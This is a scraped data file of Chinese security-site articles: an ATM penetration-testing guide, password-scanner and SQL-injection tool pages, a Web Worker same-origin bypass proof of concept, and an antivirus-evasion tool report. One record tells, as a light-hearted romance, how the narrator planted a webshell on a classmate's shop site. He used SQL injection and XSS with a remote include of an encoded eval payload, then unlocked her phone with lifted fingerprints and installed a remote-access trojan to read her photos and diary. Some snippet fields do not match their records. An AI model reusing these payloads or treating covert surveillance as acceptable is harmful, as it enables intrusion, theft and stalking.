验证成功后，用户需要输入取款金额，然后取款请求将会发送至主机服务器来进行处理。主机服务器会将交易请求发送至客户的银行，银行将会对取款金额和取款限制进行确认。如果一切正常的话，客户所在的银行将会向主机处理器的账号转账。转账成功之后，主机处理器会将许可码发送给ATM机，然后再由ATM机向用户提供现金。4. 负责管理出钞任务的是运行在ATM机中的应用程序，ATM机的出钞器会记录下每一笔交易的详细数据，例如进行交易的银行账号、交易ID、交易时间、以及交易金额等等，这些数据将会记录在ATM机的日志文件中。5. 在出钞的过程中，ATM机中的传感器会扫描每一笔交易现金的厚度。如果有纸币粘在一起，或者纸币的某个角折起来了，这个传感器都可以检测到。如果检测到两张纸币粘在一起的话，那么这两张纸币都不会被分发出去。ATM机的安全保护机制随着技术的不断发展，ATM机中的功能单元数量也在逐渐增加，而这也使得ATM机更加容易受到黑客和犯罪分子的攻击了。目前，绝大多数的ATM机仍然运行的是Windows XP，而这也使得这些ATM机在面对黑客的攻击时毫无还手之力。电子资金转账的过程由三个部分组成，即通信链路、计算机和终端设备（ATM）。如果要避免受到攻击，那么这三个组件就必须得到有效的保护。在对ATM机的整体安全性进行分析时，我们应该对哪些因素进行评估呢？接下来，让我们一起来看一看。1. 漏洞评估和网络渗透测试在处理ATM机的安全问题时，这两种方法是最常使用的。在网络渗透测试的过程中，我们需要检测ATM机网络层的安全漏洞。由于ATM机需要与后台服务器进行通信，所以ATM机或者它的某一部件必须处于这个通信网络之中。获取到ATM机的IP地址之后，我们就可以对其进行网络层的渗透测试了。从安全的角度出发，ATM机的网络应该与其他银行的网络隔离开。为了进行测试，仅仅得到ATM机的IP地址还不够，测试者还需要进入ATM机的网络中。进入之后，我们就可以使用Nessus来扫描设备的开放端口、运行中的服务、以及与这些运行服务有关的漏洞了。我们可以使用NMap来扫描设备所有的端口，包括TCP和UDP端口。除此之外，我们也可以利用Nessus来识别ATM操作系统中其他组件的漏洞，例如Adobe和IE浏览器等等。2. 应用程序安全审计由于目前大多数ATM机运行的都是Windows操作系统，所以我们可以采用配置审计的方式来提升系统的安全性。在进行配置审计的过程中，我们可以从以下几个方面入手：补丁与更新：检查系统的更新状态，确定是否安装了最新的安全补丁；文件系统安全：检查关键目录和文件的访问权限和安全性；系统访问和身份验证：检查密码锁定策略、账户锁定策略、以及用户权限策略等等；审计与日志：检查事件日志、应用安全日志、以及审计策略；账户配置：检查管理员组中的用户、默认用户以及访客账号等等，并且确认账户的有效期；ATM安全解决方案评估目前ATM机最常用的两种安全解决方案为Mcafee Solidcore和Phoenix Vista ATM。Mcafee Solidcore：McAfee应用控制机制可以防止未经授权的应用程序在ATM的操作系统中运行，这是一种基于白名单的策略。Phoenix Vista ATM：这种解决方案已经与ATM应用程序进行了整合，它可以检测系统中的关键文件是否遭到了篡改。这样一来，未经认证的程序就无法修改系统中的特定文件了。这种体系由三层结构组成，即OS &lt;–&gt; XFS &lt;–&gt; Vista ATM。具体如下图所示：金融服务扩展（XFS）是在Windows开放式系统体系结构（WOSA：Windows Open System Architecture）基础上的开发的一组标准接口，它是由欧洲标准化委员会/信息系统标准化委员会（CEN/ISSS）专题研究组编制的。在XFS的帮助下，我们无需考虑不同金融服务设备之间的区别，因为XFS所提供的通用API接口允许我们直接访问或修改这类设备。渗透测试安全解决方案我们的最终目的是为了获取到ATM操作系统的访问权，这样我们就可以了解这些应用到底是如何工作的了。获取到系统访问权之后，攻击者将在系统中安装恶意软件，然后再使用XFS组件来控制系统硬件。测试实例:1. 检查USB接口是否已启用，使用“Konboot”（或Hiren Boot）制作USB启动盘；2. 插入USB启动盘，从U盘启动系统；3. 大部分安全解决方案会在系统启动的时候就接管整个操作系统，所以请在启动的时候按住“Shift”键；4. 如果你有用户名的话，直接输入并按下回车键，我们可以在不知道密码的情况下直接访问操作系统；我们在测试的过程中，还可以从以下几个方面着手：1. 对“运行时代码认证”功能进行测试；2. 测试代码保护功能：3. 检测系统注册表项；4. 防止物理攻击5. 防止逻辑攻击；6. 防止欺诈攻击； 总结随着黑客技术的不断发展，攻击者肯定会继续研究入侵ATM机的新方法。在这场没有硝烟的战争中，银行必须占领先机。银行要部署最新的安全解决方案，并且尽可能地缩小ATM机的受攻击面。希望这篇文章能够给金融领域的安全技术人员提供一种解决安全问题的思路。","2016-11-09 15:42:44","Web安全","针对ATM机的渗透测试","http://nsoad.com/Article/web/20161109/730.html"
"5ccbfa8a4f2f0a0a7a69c081","功能一款python编写的轻量级弱口令检测脚本，目前支持以下服务：FTP、MYSQL、MSSQL、MONGODB、REDIS、TELNET、ELASTICSEARCH、POSTGRESQL特点命令行、单文件，绿色方便各种","blackhold","功能一款python编写的轻量级弱口令检测脚本，目前支持以下服务：FTP、MYSQL、MSSQL、MONGODB、REDIS、TELNET、ELASTICSEARCH、POSTGRESQL特点命令行、单文件，绿色方便各种情况下的使用。无需任何外库以及外部程序支持，所有协议均采用socket与内置库进行检测。兼容OSX、LINUX、WINDOWS，Python 2.6+(更低版本请自行测试，理论上均可运行)。参数说明python F-Scrack.py -h 192.168.1 [-p 21,80,3306] [-m 50] [-t 10]-h 必须输入的参数，支持ip(192.168.1.1)，ip段（192.168.1），ip范围指定（192.168.1.1-192.168.1.254）,ip列表文件（ip.ini），最多限制一次可扫描65535个IP。-p 指定要扫描端口列表，多个端口使用,隔开 例如：1433,3306,5432。未指定即使用内置默认端口进行扫描(21,23,1433,3306,5432,6379,9200,11211,27017)-m 指定线程数量 默认100线程-t 指定请求超时时间。-d 指定密码字典。-n 不进行存活探测(ICMP)直接进行扫描。使用例子python Scrack.py -h 10.111.1python Scrack.py -h 192.168.1.1 -d pass.txtpython Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6python NAScan.py -h ip.ini -n特别声明此脚本仅可用于授权的渗透测试以及自身的安全检测中。此脚本仅用于学习以及使用，可自由进行改进，禁止提取加入任何有商业行为的产品中。效果图开源地址https://github.com/ysrc/F-Scrack","2016-11-14 13:07:04","安全工具","弱口令检测(F-Scrack)","http://nsoad.com/Security-tools/20161114/tools-764.html"
"5ccbfa8a4f2f0a0a7a69c082","项目主页Author：wolfhttps://github.com/ysrc/F-Scrack功能一款python编写的轻量级弱口令检测脚本，目前支持以下服务：FTP、MYSQL、MSSQL、MONGODB、REDIS、TELNET、ELAST","blackhold","项目主页Author：wolfhttps://github.com/ysrc/F-Scrack功能一款python编写的轻量级弱口令检测脚本，目前支持以下服务：FTP、MYSQL、MSSQL、MONGODB、REDIS、TELNET、ELASTICSEARCH、POSTGRESQL。特点命令行、单文件，绿色方便各种情况下的使用。无需任何外库以及外部程序支持，所有协议均采用socket与内置库进行检测。兼容OSX、LINUX、WINDOWS，Python 2.6+(更低版本请自行测试，理论上均可运行)。参数说明python F-Scrack.py -h 192.168.1 [-p 21,80,3306] [-m 50] [-t 10]-h 必须输入的参数，支持ip(192.168.1.1)，ip段（192.168.1），ip范围指定（192.168.1.1-192.168.1.254）,ip列表文件（ip.ini），最多限制一次可扫描65535个IP。-p 指定要扫描端口列表，多个端口使用,隔开 例如：1433,3306,5432。未指定即使用内置默认端口进行扫描(21,23,1433,3306,5432,6379,9200,11211,27017)-m 指定线程数量 默认100线程-t 指定请求超时时间。-d 指定密码字典。-n 不进行存活探测(ICMP)直接进行扫描。使用例子python Scrack.py -h 10.111.1python Scrack.py -h 192.168.1.1 -d pass.txtpython Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6python NAScan.py -h ip.ini -n特别声明此脚本仅可用于授权的渗透测试以及自身的安全检测中。此脚本仅用于学习以及使用，可自由进行改进，禁止提取加入任何有商业行为的产品中。效果图","2016-11-12 13:11:44","安全工具","F-Scrack：服务弱口令检测脚本","http://nsoad.com/Security-tools/20161112/tools-756.html"
"5ccbfa8a4f2f0a0a7a69c083","抓取banner，识别设备或软件和操作系统","Kender","项目主页https://github.com/Neohapsis/bbqsql简介SQL盲注利用是一个痛苦的过程，当有可用的工具并且正常工作时，一切都是没问题的；但当需要写一些自定义的东西时，就会非常费时和繁琐。以上这些问题，bbqsql都可以帮你解决。BBQSQL是一个用Python写的SQL盲注框架。对于棘手的SQL注入漏洞攻击非常有用。bbqsql也是一个半自动的工具，对于那些难以触发SQL注入有比较多的定制。该工具与数据库类型无关并且非常灵活。它也有一个直观的用户界面，使攻击设置更容易。Python Gevent也被实现，使bbqsql速度非常快。概述我们试图以这样的方式来写这个工具，即用户在界面上设置开始一个攻击时，它将是非常简单明了的。但为了更加人性化，我们提供了一个详细的说明，你应该对每个配置选项的细节特别了解。值得注意的一点是，用户界面中的每一个配置选项都有与之相关的描述。使用类似于其他的SQL注入工具你需要提供一定的请求信息。必须提供下面的信息：URLHTTP MethodHeadersCookiesEncoding methodsRedirect behaviorFilesHTTP AuthProxies然后指定注入的位置以及我们正在注入的语法，详情阅读细节。安装这应该是直截了当的，但究竟是什么呢。运行下面的命令：sudo pip install bbqsql如果不能正常工作，你需要安装依赖：gevent、requests。BBQSQL选项在菜单中你会看到一个bbqsql选项的地方。在这里，您指定以下选项：query这是更详细的描述如下: query syntax overview。csv_output_file输出结果的文件的名称。如果你不想输出到一个文件，可以让这个选项空白。techniqueBBQSQL利用两技术进行SQL盲注攻击。第一，默认使用的技术是binary_search。查看维基百科获取更多的信息。第二技术你可以使用frequency_search。搜索是基于对英语的分析，确定一个字母会发生的频率。这种搜索方式对非熵数据非常快速，但对非英语或混淆数据非常慢。你可以指定binary_search或frequency_search作为此参数的值。comparison_attr这里指定你所发现SQL注入类型。在这里你可以设置bbqsql怎么确定HTTP响应的属性的真假。可以指定：status_code, url, time, size, text, content, encoding, cookies, headers, history。如果你已经确定了SQL注入会有不同的服务状态码，在这里设置status_code”。如果cookie不同则设置cookie，如果响应大小不同则设置size。concurrencyconcurrency基于Python的Gevent库。在功能上，它看起来像线程但具体如何工作中我们在这里可以看到[insert link here]，此设置控制并发的数量来运行攻击。这是有用的用于节流的请求，并加快攻击时间。真正高性能的Web服务器如nginx的，我们已经可以设置并发为75。默认情况下，这是设置为“30”。查询语法概要如果你遇到了一个SQL注入漏洞有一些奇怪的情况（如某些字符不能包含或类似ASCII /CHAR不工作），您可以自己编写了一些脚本或自定义注入语法。BBQSQL拿出脚本的一部分，为用户提供了粘贴自定义查询语法和利用的轻松方式。查询输入是构建查询语句用于从数据库读取信息。假设你已经确定了SQL注入的一个脆弱的参数，并测试了一个成功的查询。下面是一个示例查询，可以使用来参考构建你的查询：vulnerable_parameter'; if(ASCII(SUBSTRING((SELECT @@version LIMIT 1 OFFSET ${row_index}) , ${char_index} ,1))) ${comparator:&amp;gt;}ASCII(${char_val}) WAITFOR DELAY '0\:0\:0${sleep}'; --查询语法是基于占位符，告诉bbqsql如何执行攻击。你需要为攻击工作提供以下信息作为占位符。一旦你把这些放在你的查询，bbqsql将做休息：${row_index}:这里告诉bbqsql迭代列在这里。由于我们使用LIMIT，我们可以根据${row_index}的值查看n行数。${char_index}：这告诉bbqsql字符从select查询。${char_val}：这告诉bbqsql比较select结果${comparator}：这是你告诉bbqsql比较响应确定结果是不是真的。默认情况下使用&gt;符号。${sleep}：这是可选的，但告诉bbqsql插入睡眠时间，执行基于时间的SQL注入。并不是所有这些地方都是必需的。例如，如果你发现了基于布尔SQL注入可以省略$ {sleep}参数。HTTP参数BBQSQLl有许多HTTP参数配置。至少，您必须提供的网址，在那里输入你希望运行的注入查询和方法。可以设置以下选项：filesheaderscookiesurlallow_redirectsproxiesdatamethodauth您指定要使用模板${injection}来插入注入查询。如果没有注入模板，工具将不知道在哪里插入查询。files提供要发送的文件请求。设定路径的值和bbqsql需要打开和包括的文件。headers与requests一起发送的HTTP headers。这可以是一个字符串或一个字典。例如：{“User-Agent”:”bbqsql”} 或者”User-Agent: bbqsql”cookies将要和请求一起发送字典或cookies字符串。例如：{“PHPSESSIONID”:”123123″} or PHPSESSIONID=123123;JSESSIONID=foobarurl请指定要发送到的请求的地址。allow_redirects这是一个布尔值，决定是否将采用HTTP重定向请求。proxies指定一个HTTP代理用来作为字典的要求。例如：{“http”: “10.10.1.10:3128″,”https”: “10.10.1.10:1080”}data指定要随请求发送的数据。这可以是一个字符串或一个字典。例如：{“input_field”:”value”} or input_field=valuemethod指定的HTTP请求的方法。有效的方法：’get’,’options’,’head’,’post’,’put’,’patch’,’delete’auth指定一组用户名和密码用于HTTP基本认证。例如：(“myusername”,”mypassword”)Found a Bug?提交任何错误修复或功能要求: https://github.com/Neohapsis/bbqsql/帮助拜托!我们看到这是一个伟大的起点，能够建立一个充分的SQL注入框架。随时fork代码，如果他们是有用的，我们可以合并你的提交。","2016-10-14 04:48:22","安全工具","BBQSQL：SQL注入利用工具","http://nsoad.com/Security-tools/20161014/tools-557.html"
"5ccbfa8a4f2f0a0a7a69c084","worker线程中的代码具有独立的","silence","文章前介：主角：gh0stkey本人(化名:key)、国外留学学生(妹子)导火线：带有印子的纸条文章导读：一张神秘的纸条出现在主角的生活之中，却让主角颠覆了""屌丝""的身份。纸条模样还原：因为当时没想到要拍照，就借下网图。内容简介：事情是这样的，在一个阳光明媚的早晨，Key开始了老套的生活方式(洗脸刷牙..)上学去了。 ...中间省略上课不听讲的趣事。 只听""叮铃铃""的下课铃，Key跟往常一样走出教室呼吸下新鲜的空气，可是意外的在走廊上发现了一张纸条。上面的内容大概是一串数字：1001...(大概就是10这两个数字重复的使用) Key饶有兴趣的看了下，飞快的在大脑中找出了两种解决思路：二进制 摩斯电码。Key再进行思考，发现只有摩斯电码可行(这样与之匹配 1=滴 0=嗒 正好学校最近也教过摩斯电码) 这样再进行一次转换(滴=· 嗒=-) 然后对应图1进行解码，发现结果居然是个中国的手机号。出于好奇，Key使用了一个手机号位置定位的系统进行了查询：（位置仅供参考而已。）Key就在想自己班里是不是有一个就是新疆过来的？(其实就是在YY，是男的还是女的)二话不说就动手把上次备份下来的同学信息档案调出来： 看到一个叫韩雨的，名字一看，果不其然是个妹子！(到这里Key的""屌丝""气质就显露无疑了)开始进行人肉搜索，这里Key选择了Google进行搜索，先是搜索了""YuHan""的关键词，其实没有多少用处(名字太多找不到有用信息)再进行手机号的搜索发现了一个网站: 居然搜索到了这个，进去了网站瞬间给跳转到了主页index.html有经验的人就知道这个页面能被爬到，说明之前存在越权漏洞。但是到Key开始玩的时候就给修复了，Key顿时脸上就多了几条黑线。。。这彻底激发了Key的屌丝之魂，利用了Safe3进行了SQL注入的扫描 结果:http://******/index.php?shop=17 可能存在SQL注入漏洞虽然是爆出了可能存在其实使用SQLMAP注入也是可以的： 直接使用正常的语法就注入出来了：Key看到数据量也是很大的，但并没有去Dump数据而是选择了温柔的方式：--os-shell可惜的是并没有权限去执行，无奈，只得继续挖掘其他的漏洞。通过一系列的测试挖到了一个XSS反射(这里的挖掘思路无非就是见参数就使用payload插进去然后看返回的信息进行构造)：不过光一个XSS反射没有什么用，于是Key选择了代码审计这款程序，因为是一款开源的商城程序，很快就可以找到。Key直接使用Tommsearch快速搜索找到后台一处代码：&lt;?php  include($_GET['action']);  ....明眼人直接可以看出来，存在文件包含漏洞。 但是只是后台，该怎么办？于是Key就结合了XSS反射漏洞进行：Key在自己的主机上创建了个文件:1.php内容为：&lt;?php file_put_contents('key.php',base64_decode('QGV2YWwoJF9QT1NUJiM5MTtrZXkmIzkzOyk7Pz4=')); ?&gt;  然后构建了xss反射的payload：&lt;script&gt;href.location=""/admin/ad.php?action=http://****.top/1.php""&lt;/script&gt;  直接跳转到文件包含那个URL中然后包含Key的1.php文件这样就可以创建key.php木马文件了(一句话木马 也就是1.php的代码意思)。流程图：这边利用的商品评价，诱惑下后台的人。OK这次渗透就到这里，Key顺利的拿下了Webshell：之后Key得到了妹纸的买卖信息，其中步伐有胸罩购买！！(Key这时鼻血已经流出来了啦)OK获取这些之后，Key整理了下文本就关机睡觉等待第二天去撩那个妹子(韩雨)。。。。第二天来到的如此之快，再去学校的路上Key碰见了上学以来对自己很照顾的同桌，并且知道了韩雨的模样(喷血喷血，好漂酿的)走进了班级，Key东张西望，只见""清爽的头发，清秀的脸皮，清澈的眼眸""，没错就是韩雨！Key以不是很流利的英语跟韩雨打招呼，得来的却是：“我知道你是中国人，我们可以用中国话沟通的。”只听“啪啪啪啪”的响声，Key被打脸了，很疼。。。 经过跟妹子的交流，他们的关系似乎在慢慢的拉近，于是相约去吃牛排(这期间细节就不多讲，就是撩妹子)，由于有事情，妹子先走了。 Key作为一名职业的“屌丝”！随身携带胶带纸是很有必要的，于是利用胶带纸小心翼翼的采集了西餐刀上的指纹： 顺利的保留下来之后，下面的才是有趣的。 。。。 又是过了几天，Key由于迟到被留下来罚打扫教室，发现韩雨的抽屉手机没带回去。Key试着打开手机可是有密码，也不知道，懒得用知道的信息做成密码攻击字典了，于是就用之前收集好的指纹信息顺利的解锁了手机，并且打开自己的网盘，种下了以前玩的安卓远控，安然无恙的放回了抽屉中。。。。 终于，利用木马，Key有了妹子的正脸照：Key也偷看了她的日记：9.12号，今天有点累，闺蜜们都有男朋友安慰，突然觉得有男朋友真好。  这条日记 Key仿佛看到了希望！！于是Key直接干脆的来了条： 第二天，Key直接当众表白(这里当然不能少了玫瑰花)，结果是成功了！就这样Key成功的逆袭了“屌丝”的身份。","2016-09-22 15:30:17","Web安全","我是如何通过一张小纸条渗透进了妹子的心","http://nsoad.com/Article/web/20160922/425.html"
"5ccbfa8a4f2f0a0a7a69c085","关于HTML web worker的科普：","silence","原文链接：http://www.brokenbrowser.com/workers-sop-bypass-importscripts-and-basehref/原文标题：Workers SOP Bypass importScripts and baseHref原作者：@magicmac2000译：Holic (知道创宇404安全实验室)前言关于HTML web worker的科普：web worker 是运行在后台的 JavaScript，不会影响页面的性能。 当在 HTML 页面中执行脚本时，页面的状态是不可响应的，直到脚本已完成。worker线程中的代码具有独立的执行环境，有兴趣的同学可以去看相关文档。正文正如所知，所有的浏览器在试图访问不同源上的资源时会加强一些限制。当然我们可以播放或渲染来自不同域的音乐和图像，然而由于存在同源策略，我们并不能够读取这些资源的具体内容。比如我们可以在canvas上绘制一幅图像，但不能使用 getImageData 方法读取到它的具体像素信息，除非该被加载的资源和加载主体是在相同的域下的。该规则同样适用于脚本。我们可以随意加载外部不同域下的脚本，但是如果那些脚本存在错误，我们不能获取到任何有关的细节，因为错误本身可能会泄漏信息。换句话说，浏览器不惜一切代价防止资源的信息泄漏问题，即使采用禁止显示错误细节的方法。假设我们在 cracking.com.ar 上渲染了来自 brokenbrowser.com 上的脚本，如下所示：---- Main page on cracking.com.ar ----&lt;script src=""http://brokenbrowser.com/errorscript.js""&gt;&lt;/script&gt;---- Script errorscript.js hosted in brokenbrower.com ----this_is_an_error();  浏览器在执行一个不存在的函数“thisisan_error()""的时候会抛出一个异常，然而这个脚本是来自不同的源，主线程中不会显示任何相关的细节信息。实际上主页仅仅获取到简单的""Script error""信息，省略了通常会附带着的重要错误信息：错误描述，URL和行号等。主页获取到的仅仅是错误存在这一简单信息而已。浏览器这一行为是正确的，在加载可能泄露重要信息的站点的脚本或者其他文件时（比如ID，搜索记录等）保护了终端用户。Script requested from a different origin:Description: Script error  URL:  Line: 0  另一方面，如果我们把errorscript.js放在和主页相同的域下，我们会开心地看到更多的信息。注意下述不同之处：Script requested from the same origin:Description: 'this_is_an_error' is undefined  URL: http://www.cracking.com.ar/errorscript.js  Line: 1  如果想了解更多关于同源策略（SOP）的工作原理，参考该链接 。但出于研究漏洞的目的，我们对这一小部分比较感兴趣： 既然我们在相同的正常页面下，那就通过Worker绕过限制吧。通常情况下，我们不能再不同的域下面创建worker。实际上一系列尝试都会惹怒浏览器，然后马上抛出安全错误问题。那我们就试着在 cracking.com.ar 上创建一个 bing.com 的Worker，看看将会发生什么。看到了什么？我们甚至没法创建Worker！如果改变我们自己的 document.baseURI，在创建Worker之前使它指向 bing.com 的话，将会发生什么呢？Wow! 看来我们的幸运日到了？非也。如果我们在历史记录，地址和base object上面做点手脚，我们会看到很多有意思的东西。运气不是必要因素，只要坚持不懈就会有所收获，但其间也会产生许多意想不到的波折，要做好心理准备。（ We don’t need luck but just persistence shaking these objects and tons of fruit will fall (watch your head!).）。无论如何，我们赶快构造PoC，看看是不是能从bing.com 获取到泄漏信息。var base = document.createElement(""base"");  base.href = ""http://www.bing.com"";  document.head.appendChild(base);var worker = new Worker('http://www.bing.com/sa/8_1_2_5126428/HpbHeaderPopup.js');  worker.onerror = function(err)  {    alert(""URL: ""+ err.filename +        ""\n\nLine: "" + err.lineno +        ""\n\nError: "" + err.message);}Oh,我知道你现在在想些什么，bug猎手。你一定在想”仅仅泄漏成员的名称“不算什么大事，对吗？但这并不太对，因为很多站点是根据用户返回内容的，而且如果我们能泄漏足够多的数据，我们最终可能猜到关于她的成吨信息。另外，如果我们找到这个源下读取内容的js文件（像XMLHttpRequest），我们最后可以随意使用它并且获取更多的材料。在任何情况下，泄漏的”undefined sj_ic“错误信息对我们来说是不够的，我们想要更多的信息。太棒了！下面我们来试一下其他绕过这个错误的方法。这是我们不能改变baseURI，但是可以大胆地使用Worker内的importScripts 方法。这时导入的脚本会在我们的上下文（源）执行，错误信息依然会泄漏，但是我们将能够创建函数或者变量来在让 bing 的脚本跑的更远一点。例如，在导入脚本之前，我们先创建一个类似能够泄漏 “sjic” 错误信息的函数。换句话说，由于 ”sjic“ 没有定义，bing 再也不会抛出这个错误。作为奖励，我们会通过主线程获取到的参数，允许我们通过这个函数获取到一点更多的自由信息，可是先别兴奋（一颗赛艇），这是在我们的上下文源上运行的。另言之，实际上我们能读取那个函数的参数并不是个安全bug，错误信息的泄漏才是漏洞所在。// Mainvar worker = new Worker('workerimporterror.js');  worker.onmessage = function(event)  {    alert(""Text coming from Worker on bing.com:\n\n"" + event.data);}worker.onerror = function(err)  {    alert(""URL: ""+ err.filename +        ""\n\nLine: "" + err.lineno +        ""\n\nError: "" + err.message);}//---- workerimporterror.js ----function sj_ic(n)  {    self.postMessage(n);}importScripts(""http://www.bing.com/sa/8_1_2_5126428/HpbHeaderPopup.js"");  我们的sj_ic函数被外部脚本调用，通过self.postMessage我们在主线程获取到了相关数据。然后便是新泄漏的错误信息。”新“是因为现在我们创建了一个叫”sjic“的函数，就看不到之前的错误信息了。正如所见，错误信息现在是”H is undefined“当然攻击者会持续提供外部脚本，直到她获取到了想要的信息。但我们只是个娱乐的 bug-hunter，点到为止。😀译者注参考后面的测试链接可以发现，Masato Kinugawa的测试链接中，postMessage使用了arguments.callee.caller作为参数，在Edge浏览器上可以通过arguments.callee.caller获取到全文如下（测试版本Edge 25） 。原作者： Masato Kinugawa提供的： 参考测试链接在 Edge/IE 上测试成功来自@Masato Kinugawa的测试链接：https://vulnerabledoma.in/edge_workerleak/","2016-09-28 19:11:58","Web安全","Web Worker 中的 importScripts 和 baseHref 同源策略绕过问题","http://nsoad.com/Article/web/20160928/459.html"
"5ccbfa8a4f2f0a0a7a69c086","意大利萨尼奥大学（the University of Sannio）的研究团队Iswatlab，证实了打造一个能够规避杀软的恶意程序有多么容易。“编写”一个新的恶意软件，规避杀软或其它防护软件的检测，这很难。但是，“制造”","silence","为什么Signal会被认为是最安全的即时消息应用？这是由于它只会储存很少量的关于用户和事件的信息。斯诺登力荐的Signal尽管现在很多热门应用都实现了端到端加密，但这也不一定能保证安全。安全专家们之所以强烈推荐Signal来作为安全通信的工具，是因为在DNC（美国民主党全国委员会）黑客事件后，这款号称“斯诺登核准”的应用，也成为相关职员的指定即时通信应用。如果在网上搜索Signal，大家可以看到斯诺登极力推荐过这款应用。斯诺登曾表示，使用OpenWhisper Systems的任何产品都绝对靠谱。约翰霍普金斯大学的密码学教授Matt Green，以及知名安全专家Bruce Schneier也是Signal的粉丝。为什么大家认为Signal更安全安全专家和隐私主义者意识到，几乎所有的通信应用都会储存大量有关于用户活动的信息数据。而一旦这些数据被人获取，结合其他诸如运营商提供的信息，完全可以识别出用户的真实身份。    一般通信应用都会储存通信的日期和时间，当然还有用户的电话号码。苹果的iMessage会记录用户的手机号和其他元数据，这些可能会泄露给执法机构。The Intercept的那封文档，标题为“执法机构的iMessage 的常见问题”，这是佛罗里达州执法部门的电子监控团队部分资料的缓存。其中的内容显示，iMessage日志记录了通信的日期、时间和用户IP，这些可以用来识别出用户的位置。然而，Signal只会储存少量的用户事件和信息。精简于型即为安全据Signal应用的缔造者OpenWhisper Systems公司所述，早些时候FBI（弗吉尼亚东区）曾传讯调查两个Signal用户，结果最后没有拿到任何重要信息。他们表示，通过对Signal的精心设计，Signal最后保留的数据只有用户的注册日期和最近的登陆日期。FBI曾要求提供以下的数据：用户名支付信息相关IP地址电子邮件地址历史日志浏览器cookie其他与电话号相关信息但是OpenWhisper Systems在很无奈地提供了所有信息后，这些东西在调查中并没有起到什么作用：你可以看到大量由美国公民自由联盟（ACLU）出版的法庭文件，这代表着Open Whisper Systems也在不断努力。此外，Open Whisper Systems还给WhatsApp、Facebook Messenger，以及谷歌Allo隐身模式提供了Signal协议作为支持。","2016-10-10 15:44:54","安全工具","斯诺登力荐，号称史上最安全的即时通信应用Signal","http://nsoad.com/Security-tools/20161010/tools-518.html"
"5ccbfa8a4f2f0a0a7a69c087","0x00 前言Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显","silence","意大利萨尼奥大学（the University of Sannio）的研究团队Iswatlab，证实了打造一个能够规避杀软的恶意程序有多么容易。“编写”一个新的恶意软件，规避杀软或其它防护软件的检测，这很难。但是，“制造”一个能够躲避反恶意软件解决方案的恶意软件，却很简单。“编写”和“制造”的区别就在于，后者一行代码都不用编写，只需要点击一个按钮。萨尼奥大学的研究团队Iswatlab (www.iswatlab.eu)，实现了一个转换移动终端恶意代码的引擎，能够修改代码的外部特征，而不影响恶意程序的行为。他们把这个工具命名为“恶意软件清洗机”（Malware Washing Machine）。该团队研究的Android系统恶意软件转换引擎，可以执行下列变换操作：反汇编和重新汇编重新打包修改包名称重命名标识符数据编码间接调用代码乱序花指令插入复合变换Iswatlab团队使用恶意软件清洗机测试了57个著名的商业反恶意软件解决方案。他们用这个工具修改了5560个恶意软件，这些恶意软件能被要测试的这57个杀软检测出来。在修改之后，大多数杀软都无法检测出大部分恶意软件。“基于特征的检测算法在移动终端上是否有效？我们开发了一个框架，能够对Android应用程序进行细微的变形。接着，我们修改了现实世界中的恶意软件（见https://www.sec.cs.tu-bs.de/~danarp/drebin/index.html），然后，将这些程序提交到 www.virustotal.com网站，为了知道转换之前和转换之后的检测情况，我们在转换之前和转换之后，都会把每一个样本上传检测”报告中这样说到。测试结果显示，转换之后，部分杀软仍然能够识别出某些恶意软件是同一个家族，但占了很小的一部分。在下表中，第一列表示杀软，第二列表示被该杀软正确检测出来的样本（转换之前）的数量，第三列表示被正确检测出来的样本（转换之后）的数量。”结果显而易见，杀软无法识别出被转换之后的恶意软件（在可以识别出原始恶意软件的条件下）。转换引擎的源代码已经公开了，地址为https://github.com/faber03/AndroidMalwareEvaluatingToolsIswatlab团队的实验的详细结果见报告“利用恶意软件混淆技术对抗杀软检测”这个测试引起了关于对抗恶意软件的能力的讨论，Iswatlab团队的专家无需编写一行代码，只需要用一些常用的手段，就可以制造一个新的恶意软件。总结，打造一个能够躲避安全解决方案检测的新的恶意软件，只需要几分钟。将旧的恶意软件放到恶意软件清洗机中即可！恶意软件清洗机可以在这里获取。","2016-10-10 15:47:52","安全工具","打造“免杀”的恶意程序需要多久？用这个工具，只要几分钟","http://nsoad.com/Security-tools/20161010/tools-519.html"
"5ccbfa8a4f2f0a0a7a69c088","分布式系统大都需要依赖于消息队列中间件来解决异步处理、应用耦合等问题，消息队列中间件的选择又依赖于整体系统的设计和实现，消息的封装、传递、处理贯穿了整个系统，如果在某一个关键处理逻辑点上出现","silence","UAC（User Account Control）概述UAC（用户帐户控制）是微软公司为了提高Windows系统安全性而在Windows Vista中引入的一种新新型安全技术，它要求用户在执行某些可能会影响计算机运行的操作或更改其他用户设置的操作之前，向系统申请权限或提供管理员‌密码。通过在这些操作启动前对其进行验证，UAC 可以帮助防止恶意软件和间谍软件在未经许可的情况下在计算机上进行安装或对计算机进行更改。 UAC存在的意义这项安全机制可以防止企业环境中由于员工的某些错误的操作而引起的安全问题。如果员工能够轻易获取管理员权限的话，他们往往会在无意中修改设备的配置，并且安装某些禁止安装的软件。但如果不给员工提供本地管理员权限的话，他们又无法正常工作了。如果某位员工的计算机感染了恶意软件，而他的用户账号又拥有完整的管理员权限的话，那么问题就难办了。用户账户控制（UAC）可以允许我们以普通用户权限来进行某些操作。这样一来，当你在安装服务、驱动程序、或者写入某些系统文件时出现了问题的话，也不至于会直接影响系统的运行。此时，用户需要与Windows的桌面环境进行交互，例如右键点击程序，然后选择“以管理员身份运行”，此时系统会弹出UAC对话框以供用户进行选择。UAC可以调整用户账户的权限等级，这也就意味着即便是我们当前的账号拥有本地管理员权限，我们仍然能够以普通用户的身份来执行某些程序。当程序要求以管理员身份运行时，系统会弹出一个UAC对话框来告知用户。此时如果用户选择“同意”的话，那么就需要输入本地管理员密码来进行下一步操作。但是具体的情况还是要看用户是如何进行设置的。 Bypass-UAC简介－［Github主页传送门］Bypass-UAC提供了一个能够进行UAC绕过的框架，该框架可以通过调用IFileOperation 